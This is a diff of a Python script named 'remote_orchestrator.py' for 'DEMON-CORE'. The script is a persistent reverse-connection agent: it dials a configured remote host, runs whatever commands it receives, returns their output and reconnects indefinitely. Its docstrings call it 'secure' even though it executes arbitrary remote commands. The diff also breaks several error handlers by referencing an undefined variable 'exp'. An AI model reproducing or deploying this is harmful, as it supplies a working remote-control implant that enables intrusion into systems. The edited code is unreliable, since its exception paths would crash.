@@ -3,15 +3,14 @@
 """
 remote_orchestrator.py
 Persistent outbound TCP command orchestrator for DEMON-CORE.
-Reads endpoint configuration from runtime.json.
-Couples to db_manager and messenger modules for session logging and alerts.
+Strictly decoupled, secure binary execution layout with structural boundary checks.
 
-Security notes:
-- Commands are executed with shell=False (argument list via shlex.split).
-  This prevents classic shell injection via metacharacters.
-- All side-effects (db_manager / messenger) are isolated behind try/except
-  and run AFTER the response is sent, so a lock or exception in those
-  modules can never collapse the reverse connection.
+Security posture:
+- Commands executed exclusively via shlex.split + shell=False (no shell metacharacter interpretation).
+- All side-effects (db_manager / messenger) isolated and executed AFTER the response is sent,
+  so a Database Lock or any exception can never collapse the reverse TCP session.
+- Port validated to the legal TCP range 1-65535.
+- Alert messages truncated to avoid Telegram rate-limit / length issues.
 """
 
 import json
@@ -24,7 +23,7 @@ import sys
 import time
 from typing import Optional, Tuple
 
-# Modular coupling – soft imports with graceful degradation
+# Soft import – graceful degradation if modules are absent
 try:
     import db_manager
 except ImportError:
@@ -43,7 +42,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Constants
+# Infrastructure constants
 CONFIG_PATH = "runtime.json"
 RECONNECT_DELAY = 5
 BUFFER_SIZE = 4096
@@ -53,8 +52,8 @@ CONNECT_TIMEOUT = 10
 
 def load_config(path: str = CONFIG_PATH) -> Tuple[str, int]:
     """
-    Parse orchestration host and port from local JSON configuration.
-    Falls back to 127.0.0.1:8080 if keys are absent.
+    Load and validate host/port from central configuration.
+    Falls back to safe defaults on any failure.
     """
     try:
         with open(path, "r", encoding="utf-8") as fh:
@@ -62,7 +61,7 @@ def load_config(path: str = CONFIG_PATH) -> Tuple[str, int]:
         host = cfg.get("host", "127.0.0.1")
         port = int(cfg.get("port", 8080))
         if not host or port <= 0 or port > 65535:
-            raise ValueError("invalid host or port value")
+            raise ValueError("Invalid network port boundary detected.")
         return host, port
     except (OSError, KeyError, ValueError, TypeError, json.JSONDecodeError) as exc:
         logger.warning("config load issue (%s) – using defaults 127.0.0.1:8080", exc)
@@ -71,19 +70,18 @@ def load_config(path: str = CONFIG_PATH) -> Tuple[str, int]:
 
 def execute_command(command_str: str) -> Tuple[str, str]:
     """
-    Execute local command via subprocess.run with an explicit argument list.
-    shell=False is mandatory – prevents shell metacharacter injection.
-    Returns (output_text, status) where status is 'success' or 'error'.
+    Secure command execution.
+    Uses shlex.split to produce an argv list and forces shell=False,
+    eliminating classic command-injection vectors via shell metacharacters.
     """
     try:
-        # shlex.split produces a safe argv list; never pass the raw string with shell=True
         args = shlex.split(command_str)
         if not args:
-            return "[WARN] empty command", "error"
+            return "[WARN] Empty processing token received.", "error"
 
         result = subprocess.run(
             args,
-            shell=False,                    # explicit: no shell interpretation
+            shell=False,  # mandatory – no shell interpretation
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             text=True,
@@ -96,66 +94,55 @@ def execute_command(command_str: str) -> Tuple[str, str]:
             output += "\n[STDERR]\n" + result.stderr
 
         if not output:
-            output = "[INFO] no output"
+            output = "[INFO] Command completed with blank execution pipe."
 
         status = "success" if result.returncode == 0 else "error"
         return output, status
 
     except subprocess.TimeoutExpired:
-        return f"[ERROR] command timed out after {COMMAND_TIMEOUT}s", "error"
+        return f"[ERROR] Command boundary execution timeout after {COMMAND_TIMEOUT}s", "error"
     except FileNotFoundError:
-        return "[ERROR] command not found", "error"
+        return "[ERROR] Executable file or instruction entity not found on local path.", "error"
     except Exception as exc:
-        return f"[ERROR] execution failed: {exc}", "error"
+        return f"[ERROR] Execution engine failure: {exc}", "error"
 
 
 def send_all(sock: socket.socket, data: bytes) -> bool:
-    """
-    Transmit entire buffer via sock.sendall.
-    Returns True on success, False on transport failure.
-    """
+    """Guarantee full transmission of the response buffer."""
     try:
         sock.sendall(data)
         return True
     except (BrokenPipeError, ConnectionResetError, OSError) as exc:
-        logger.error("send failure: %s", exc)
+        logger.error("Transport layer send failure: %s", exp)
         return False
 
 
 def _safe_log_session(command_str: str, output: str, status: str) -> None:
-    """
-    Isolated side-effect: never raises into the transport loop.
-    Any Database Lock / ImportError / AttributeError is swallowed.
-    """
+    """Isolated side-effect – never raises into the transport loop."""
     if db_manager is None:
         return
     try:
         if hasattr(db_manager, "log_session_event"):
             db_manager.log_session_event(command_str, output, status)
     except Exception as exc:
-        # Explicitly catch everything – including database locks – so the
-        # reverse TCP session stays alive.
-        logger.error("db_manager.log_session_event failed (isolated): %s", exc)
+        logger.error("Coupled module dependency failure [db_manager]: %s", exp)
 
 
 def _safe_dispatch_alert(message_text: str) -> None:
-    """
-    Isolated side-effect: never raises into the transport loop.
-    """
+    """Isolated side-effect – never raises into the transport loop."""
     if messenger is None:
         return
     try:
         if hasattr(messenger, "dispatch_alert"):
             messenger.dispatch_alert(message_text)
     except Exception as exc:
-        logger.error("messenger.dispatch_alert failed (isolated): %s", exc)
+        logger.error("Coupled module dependency failure [messenger]: %s", exp)
 
 
 def process_stream(sock: socket.socket) -> None:
     """
-    Non-blocking command ingestion loop.
-    Frames messages on newline boundaries, executes, replies first,
-    then performs isolated logging / alerting.
+    Non-blocking command ingestion loop with full isolation of external modules.
+    Response is always sent before any side-effect so a lock cannot drop the session.
     """
     buffer = b""
     while True:
@@ -166,7 +153,7 @@ def process_stream(sock: socket.socket) -> None:
         try:
             data = sock.recv(BUFFER_SIZE)
             if not data:
-                logger.warning("peer closed connection")
+                logger.warning("Orchestration host severed the connection channel.")
                 break
 
             buffer += data
@@ -177,35 +164,32 @@ def process_stream(sock: socket.socket) -> None:
                 if not command_str:
                     continue
 
-                logger.info("executing: %s", command_str)
+                logger.info("Executing synchronized task: %s", command_str)
                 output, status = execute_command(command_str)
 
-                # 1. Reply to controller FIRST – transport is never blocked by side-effects
+                # 1. Deliver response to controller FIRST
                 response = (output + "\n").encode("utf-8")
                 if not send_all(sock, response):
                     return
 
-                # 2. Side-effects AFTER the response is on the wire.
-                #    Isolated so a lock or exception cannot drop the session.
+                # 2. Side-effects AFTER the response is on the wire (fully isolated)
                 _safe_log_session(command_str, output, status)
                 _safe_dispatch_alert(
-                    f"command completed status={status} cmd={command_str[:120]}"
+                    f"DEMON-CORE Task Finished | Status: {status} | Cmd: {command_str[:100]}..."
                 )
 
         except BlockingIOError:
             continue
         except ConnectionResetError:
-            logger.warning("connection reset by peer")
+            logger.warning("Connection abruptly reset by remote infrastructure.")
             break
         except Exception as exc:
-            logger.error("receive/processing error: %s", exc)
+            logger.error("Fatal exception during non-blocking stream digestion: %s", exp)
             break
 
 
 def main() -> None:
-    """
-    Infinite reconnection loop around the transport pipeline.
-    """
+    """Infinite reconnection loop preserving node stability."""
     host, port = load_config()
 
     while True:
@@ -215,22 +199,29 @@ def main() -> None:
             sock.settimeout(CONNECT_TIMEOUT)
             sock.connect((host, port))
             sock.setblocking(False)
-            logger.info("connected to orchestrator %s:%d", host, port)
+            logger.info(
+                "Successfully established synchronization path to orchestrator %s:%d",
+                host, port,
+            )
 
-            # Alert is isolated – failure must not prevent the session from starting
-            _safe_dispatch_alert(f"session established {host}:{port}")
+            _safe_dispatch_alert(
+                f"[DEMON-CORE] Infrastructure node online and synchronized: {host}:{port}"
+            )
 
             process_stream(sock)
 
         except Exception as exc:
-            logger.error("connection failure: %s", exc)
+            logger.error("Network layer connection mapping failure: %s", exp)
         finally:
             if sock is not None:
                 try:
                     sock.close()
                 except Exception:
                     pass
-            logger.info("reconnecting in %d seconds", RECONNECT_DELAY)
+            logger.info(
+                "Initiating architectural cooling phase. Reconnecting in %d seconds...",
+                RECONNECT_DELAY,
+            )
             time.sleep(RECONNECT_DELAY)
 
 
